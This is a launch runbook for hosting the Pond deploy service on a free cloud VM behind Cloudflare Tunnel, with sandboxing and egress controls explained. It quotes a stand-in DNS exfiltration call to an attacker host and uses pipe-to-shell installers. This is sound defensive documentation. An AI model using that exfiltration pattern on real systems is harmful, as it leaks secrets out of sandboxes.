# Pond operations guide

Going from "alpha on my laptop" to a public hosted service like Lakebed. This is the launch runbook.

**Stack**

| Layer     | Choice                                                      | Cost        |
| --------- | ----------------------------------------------------------- | ----------- |
| Compute   | Oracle Cloud Always Free ARM (Ampere A1, 4 OCPU, 24 GB RAM) | $0/mo       |
| Ingress   | Cloudflare Tunnel (no public IP needed)                     | $0/mo       |
| DNS       | Cloudflare DNS                                              | $0/mo       |
| TLS       | Cloudflare Universal SSL (automatic, wildcard included)     | $0/mo       |
| Domain    | Cloudflare Registrar (at-cost)                              | ~$10/yr     |
| **Total** |                                                             | **~$10/yr** |

Fallback if Oracle ever terminates: Hetzner CAX11 ARM (€3.79/mo). The rest of the stack is unchanged.

---

## 1. Buy the domain

1. Sign in to Cloudflare → Domain Registration → Register Domains.
2. Find your domain (e.g. `pond.example.com`). Cloudflare sells at registry cost; no markup, free WHOIS privacy, two-factor on the registrar.
3. After registration, Cloudflare auto-creates a DNS zone for it.

Picking a name: short, memorable, neutral. `.com` is safest. `.sh`, `.dev`, `.app`, `.run` are nice but pricier. Avoid country TLDs unless you know the registrar's policies (some countries require local presence).

## 2. Get an Oracle Cloud Always Free VM

1. Sign up at https://cloud.oracle.com. Account creation requires a credit card for identity but the Always Free tier is genuinely free (no auto-upgrade).
2. Pick a home region close to you — this is permanent.
3. Compute → Instances → Create Instance.
   - Shape: **VM.Standard.A1.Flex** (Ampere ARM). Allocate **4 OCPU, 24 GB memory**. This is the Always Free maximum.
   - Image: **Ubuntu 22.04 minimal aarch64**.
   - Networking: default VCN is fine. Note the public subnet.
   - SSH key: paste your public key. Save the private key.
4. After it's running, copy the public IP. SSH in: `ssh ubuntu@<ip>`.

**Critical Oracle gotchas:**

- Log in to the Oracle Cloud console at least once a month. Idle accounts get reclaimed.
- The default Ubuntu image has `iptables` rules that drop most inbound traffic. We don't need inbound (Cloudflare Tunnel is outbound-only), so this is fine.
- ARM `node` is well-supported but check `uname -m` returns `aarch64` before installing.

If you don't want to deal with Oracle, skip to the Hetzner fallback at the bottom.

## 3. Install Node 22 + Docker on the VM

```bash
# Update + basics
sudo apt update && sudo apt upgrade -y
sudo apt install -y ca-certificates curl gnupg git

# Node 22 (NodeSource)
curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
sudo apt install -y nodejs

# Docker
curl -fsSL https://get.docker.com | sudo bash
sudo usermod -aG docker $USER
newgrp docker  # so this shell picks up the group

# Verify
node --version    # v22.x
docker --version
docker compose version
```

## 4. Clone Pond on the VM

```bash
git clone https://github.com/DevvGwardo/pond.git /srv/pond
cd /srv/pond
npm ci
npm run build
npm test                                # full suite should pass
```

## 5. Configure the host

```bash
cd /srv/pond

# Pick your bare hostname here (matches your domain choice in step 1).
cp deploy/.env.example deploy/.env
$EDITOR deploy/.env
```

Fill in:

```
POND_PUBLIC_HOST=pond.example.com
POND_PUBLIC_BASE_URL=https://pond.example.com
POND_ABUSE_EMAIL=abuse@example.com
POND_HOST_TOKEN=<output of: openssl rand -hex 32>
POND_TRUST_PROXY_HEADERS=1
```

**Save the host token in a password manager.** It's the recovery key for the entire control plane.

## 6. Cloudflare Tunnel

Easiest if you do this from your laptop, not the VM (cloudflared's interactive login uses your browser).

```bash
# Laptop
brew install cloudflared    # or download from cloudflare
cloudflared tunnel login

# Create the tunnel
cloudflared tunnel create pond-host
# → prints a tunnel ID and writes ~/.cloudflared/<id>.json

# Route DNS (these add CNAME records in your Cloudflare zone)
cloudflared tunnel route dns pond-host pond.example.com
cloudflared tunnel route dns pond-host '*.pond.example.com'
```

Now copy the credentials and config onto the VM:

```bash
# Laptop
scp ~/.cloudflared/<tunnel-id>.json ubuntu@<vm-ip>:/srv/pond/deploy/cloudflared/credentials.json

# VM
cd /srv/pond
cp deploy/cloudflared/config.example.yml deploy/cloudflared/config.yml
$EDITOR deploy/cloudflared/config.yml    # replace <TUNNEL_ID> and hostnames
```

## 7. Launch

```bash
cd /srv/pond
docker compose -f deploy/docker-compose.yml up -d
docker compose -f deploy/docker-compose.yml logs -f --tail=100
```

You should see `pond host control plane running` and Cloudflare Tunnel reporting `Registered tunnel connection`.

Open `https://pond.example.com` in a browser — you should see the landing page.

## 8. Bootstrap your admin user

From your laptop (with the CLI installed: `npm install -g pondsh`):

```bash
pond login --api https://pond.example.com --username your-name
# Paste the POND_HOST_TOKEN value when prompted.
```

This creates the first admin account and saves your user token to `~/.pond/credentials.json` (mode 0600).

## 9. End-to-end smoke test

From your laptop:

```bash
mkdir hello && cd hello
pond new my-cap --no-git
cd my-cap
pond deploy --api https://pond.example.com
# → returns a URL like https://abc123def4567890.pond.example.com
# → returns a claim token
```

Visit the URL. The capsule's `/api/query/messages` should respond with `[]`. The host listing on `pond.example.com/abuse` should be reachable.

## 10. Lock down

### Cloudflare-side

- Enable **Always Use HTTPS**: Cloudflare → SSL/TLS → Edge Certificates.
- Enable **Bot Fight Mode**: Cloudflare → Security → Bots. Catches obvious abuse cheap.
- Enable a **Rate Limiting Rule**: Security → WAF → Rate limiting rules. Suggested baseline:
  - URL: `*pond.example.com/api/deploys`
  - 10 requests per 1 minute per IP → block 10 minutes.
- Add a **Firewall Rule** to block known abuse user-agents (curl, python-requests, masscan) on the bare domain if abuse spikes. Keep them allowed on subdomains (real users hit deploy URLs via fetch/curl).

### Server-side

- Confirm the host process listens only on loopback inside the container — `docker compose exec pond-host ss -tnlp | grep 8787` should show `127.0.0.1:8787`, not `0.0.0.0:8787`. The `expose:` clause in compose keeps it container-network only; nothing should be on the host's external interface.
- Audit log: `curl -H "Authorization: Bearer <admin-token>" https://pond.example.com/api/audit?limit=50`. Set a daily cron that mails you the count of `deploy.create` events from anonymous users — runaway abuse will be visible there first.

### Egress

The JS-level network shim is best-effort. For an outbound firewall (closes the DNS exfiltration gap I documented in commit `6297160`):

```bash
# As root on the VM. Block all outbound from the container network range
# except DNS to Cloudflare resolvers and Cloudflare Tunnel itself.
# Tune to your container subnet (docker inspect bridge).
sudo iptables -I DOCKER-USER -s 172.17.0.0/16 -j DROP
sudo iptables -I DOCKER-USER -s 172.17.0.0/16 -d 1.1.1.1 -p udp --dport 53 -j ACCEPT
sudo iptables -I DOCKER-USER -s 172.17.0.0/16 -d 1.1.1.1 -p tcp --dport 443 -j ACCEPT
```

This breaks any capsule's outbound fetch / dns.lookup, but it's the right default for an anonymous tier.

## 11. Backups

The control DB is at `/var/lib/docker/volumes/pond_pond-data/_data/control.db` (Docker volume) or `/var/lib/pond/control.db` (systemd path). SQLite has no replication; you have to copy the file out.

```bash
# /etc/cron.daily/pond-backup
#!/bin/bash
set -e
TS=$(date +%F)
docker compose -f /srv/pond/deploy/docker-compose.yml exec -T pond-host \
  sqlite3 /data/control.db ".backup '/data/backups/control-$TS.db'"
# Rotate: keep 7 daily, 4 weekly
find /var/lib/docker/volumes/pond_pond-data/_data/backups -mtime +30 -delete
```

Set up rclone / restic / a simple `scp` to an off-box destination. Cheap options:

- **Backblaze B2**: ~$6/TB/yr. Fits 1 GB of control.db backups for $0.06/yr.
- **AWS S3 Deep Archive**: ~$1/TB/mo. Slow to restore but cheaper for "I hope I never need this."

## 12. Upgrades

```bash
cd /srv/pond
git pull
docker compose -f deploy/docker-compose.yml build pond-host
docker compose -f deploy/docker-compose.yml up -d pond-host
docker compose -f deploy/docker-compose.yml logs --tail=50 -f pond-host
```

Existing deploys re-fork on host restart. Anonymous deploys past their grace window get terminated by the sweeper.

If you need to roll back, the previous image is still in Docker. `docker images | grep pond` and `docker compose ... up -d pond-host --image <previous>`.

## 13. Migration to Hetzner (if Oracle pulls the rug)

Same stack, different box. Hetzner Cloud → Server → Create:

- Location: any
- Image: Ubuntu 22.04
- Type: CAX11 (ARM, 2 vCPU, 4 GB RAM, €3.79/mo)
- SSH key: yours

Then steps 3–7 from above on the new VM. The Cloudflare Tunnel can be re-used — bring up `cloudflared` with the same credentials on the new box, point the tunnel ingress at the new container, take the old box down. DNS doesn't change.

To preserve the control DB across the migration:

```bash
# Old box
docker compose -f deploy/docker-compose.yml stop pond-host
docker run --rm -v pond_pond-data:/data -v $(pwd):/out alpine \
  tar czf /out/pond-data.tar.gz -C /data .

# Move pond-data.tar.gz to the new box

# New box (after step 7, BEFORE step 8)
docker compose -f deploy/docker-compose.yml down
docker volume create pond_pond-data
docker run --rm -v pond_pond-data:/data -v $(pwd):/in alpine \
  tar xzf /in/pond-data.tar.gz -C /data
docker compose -f deploy/docker-compose.yml up -d
```

Users keep their accounts and deploys.

---

## Known limitations (be honest with your users)

These are documented in [`docs/abuse-policy.md`](./abuse-policy.md) and shown to anonymous users on the landing page:

1. **No full VM isolation**. There is no per-tenant kernel/network namespace. A determined attacker with native code can still escape the Node permission sandbox, and capsules share the host network namespace (loopback). For a truly hostile environment, replace `fork()` with Firecracker microVMs or Cloudflare Sandbox SDK. Not in scope for the budget launch.

   What **is** enforced today, in layers:
   - **OS privilege separation for anonymous workers.** When the host runs as root, each anonymous-_unclaimed_ capsule worker is forked under a dedicated unprivileged uid/gid (`POND_SANDBOX_UID`/`POND_SANDBOX_GID`, defaulting to the `pond-sandbox` system account, resolved at boot). A native-addon escape then lands as a powerless user, not as the control plane. Claimed/authenticated deploys keep the host uid. **Fallback:** when the host is not root or the sandbox user can't be resolved, the host logs a warning and runs workers under the host uid (degrades to the prior behaviour — it never fails to boot). The hardened container (§3) runs as a non-root user and cannot setuid, so the drop is a no-op there; use it together with the cgroup/nft layer.
   - **Kernel egress** (the nft firewall, §4) matches on capsule **cgroup membership**, which is uid-independent, so a dropped uid stays covered. It remains the real outbound boundary.
   - **JS-level network shim** (defense-in-depth, not the boundary): `fetch`/`undici`, `net.Socket.connect`, **and** `dns.lookup`/`dns.resolve` are blocked in restricted workers. The DNS patch closes the obvious `dns.lookup("<secret>.attacker.com")` exfil at the JS layer (literal IPs and `localhost` still resolve so the worker can bind its own server); real DNS exfil is closed for keeps only by the nft rule dropping 53.

2. **Single-instance**. The control plane is one box. Horizontal scaling needs a real DB (Postgres) and shared deploy storage — meaningful refactor.
3. **No payments / paid tier yet**. Anonymous and authenticated are both free. Add Stripe + billing tables when you need to.
4. **No incident response automation**. If a deploy goes viral and burns your CPU budget, you find out via the audit log or your VPS bill, not an alert.

## The anonymous-deploy trust boundary

"Deploy anonymously" does **not** mean "run arbitrary untrusted code with no recourse." Anonymous deploys sit inside a layered boundary:

1. **Human/bot challenge** — set `--turnstile-secret` (or `POND_TURNSTILE_SECRET`) and anonymous `POST /api/deploys` must carry a verified Cloudflare Turnstile token. Off by default so dev/CI stay frictionless; turn it on for a public host. Authenticated deploys are never challenged.
2. **Per-IP rate limit** — `--anonymous-rate-per-hour` (default 5) caps how fast one IP can create deploys.
3. **Sandbox + egress policy** — each capsule runs in Node's permission model; anonymous-unclaimed capsules get the network shim, and `--capsule-egress=sealed` plus the OS firewall can harden this further.
4. **Automatic TTL** — unclaimed deploys are terminated after `--anonymous-grace` and deleted after `--anonymous-retention` by the sweeper.
5. **Manual kill switch** — `pond admin terminate <deployId>` (host-token gated) takes any deploy offline immediately, without waiting for its grace window.

For a truly hostile multi-tenant environment you still want the JS sandbox replaced with Firecracker or the Cloudflare Sandbox SDK (see the limitations above) — Turnstile + rate limits + manual terminate raise the cost of abuse, they don't make the JS sandbox airtight.

## What's next after launch

In rough priority order:

- ~~Add a captcha (Cloudflare Turnstile, free) to anonymous deploy.~~ **Done** — `--turnstile-secret` / `POND_TURNSTILE_SECRET` on `pond host`.
- ~~Add a `pond admin terminate <deployId>` CLI subcommand backed by the existing host token.~~ **Done** — see [`pond admin terminate`](./cli-reference.md#pond-admin-terminate).
- Replace the JS-level sandbox with Firecracker or Cloudflare Sandbox SDK.
- Postgres + S3 backend for the control plane (when one box stops being enough).
- Stripe billing for higher tiers.

None of these block your launch.
